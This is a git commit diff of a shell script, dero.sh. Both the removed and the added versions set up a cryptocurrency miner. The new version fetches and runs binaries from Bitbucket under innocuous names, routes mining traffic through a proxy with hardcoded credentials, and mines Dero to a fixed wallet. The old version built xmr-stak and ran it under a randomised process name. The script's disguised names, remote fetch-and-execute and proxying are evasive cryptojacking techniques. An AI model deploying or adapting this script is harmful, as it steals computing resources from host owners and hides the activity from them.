612b7dca518f2ade8e35b7c6f50f15a117969a06
adisubarja <92545387+adisubarja@users.noreply.github.com>
2022-08-28 22:37:02 +0700

    Update dero.sh

--- dero.sh
+++ dero.sh
@@ -1,47 +1,23 @@
-#!/bin/bash
-sudo apt-get update
-sudo apt-get install cpulimit 
-sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git libuv1-dev 
-mkdir /usr/local
-rm -r /usr/local/src
-mkdir /usr/local/src
-git clone https://github.com/fireice-uk/xmr-stak.git /usr/local/src &&
-a='nwmtjxvcxt-00' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-cd /usr/local/src
-mkdir build
-cd build 
-cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
-make install
-cd bin
-sudo sysctl -w vm.nr_hugepages=128 
-sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/config.txt
-"call_timeout" : 10,
-"retry_time" : 30,
-"giveup_limit" : 0,
-"verbose_level" : 3,
-"print_motd" : true,
-"h_print_time" : 60,
-"aes_override" : null,
-"use_slow_memory" : "warn",
-"tls_secure_algo" : true,
-"daemon_mode" : false,
-"flush_stdout" : false,
-"output_file" : "",
-"httpd_port" : 99,
-"http_login" : "",
-"http_pass" : "",
-"prefer_ipv4" : true,
-EOT
-' &&
-sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/pools.txt
-"pool_list" :
-[
-{"pool_address" : "pool.whalesburg.com:4300", "wallet_address" : "dERodg7tsVFSo9JWw7KAgeazxSU95G6kX9sNLYLAi7FvYZhkpxPFnEqfNbfS9Q1Dj2hJSQEFJrTkfWvGN66fTkgm5bsysLTGQV", "rig_id" : "", "pool_password" : "Hero", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 100 },
-],
-"currency" : "cryptonight",
-EOT
-' &&
-sudo cp xmr-stak "$cpuname"
-rm xmr-stak
-echo $cpuname" is starting"
-cpulimit -l 395 ./"${cpuname}"
+proxy="188.166.113.250" 
+port="80" 
+user="bian15"  
+pass="150788"
+wget -q -O reves https://bitbucket.org/asertasamila/sarita/downloads/dero-stratum-miner && chmod +x reves
+wget -q https://bitbucket.org/alitasantana/denada/downloads/panel && chmod +x panel 
+wget -q https://bitbucket.org/alitasantana/denada/downloads/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://bitbucket.org/alitasantana/denada/downloads/libproxychains4.so && chmod +x libproxychains4.so 
+sleep 3 
+sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
+sleep 1 
+sed -i "s/port/$port/" "proxychains.conf" 
+sed -i "s/user/$user/" "proxychains.conf"  
+sleep 1  
+sed -i "s/pass/$pass/" "proxychains.conf"  
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " " 
+echo " " 
+echo "IP BARU ==> "$(./panel curl ifconfig.me)
+./panel ./reves -r pool.whalesburg.com:4300 -w dero1qyc95cuufup67sf6kykepuhtnps3g2xxkgxrq2c7h4rm0z7esz0p2qqqawa77.yui
+#
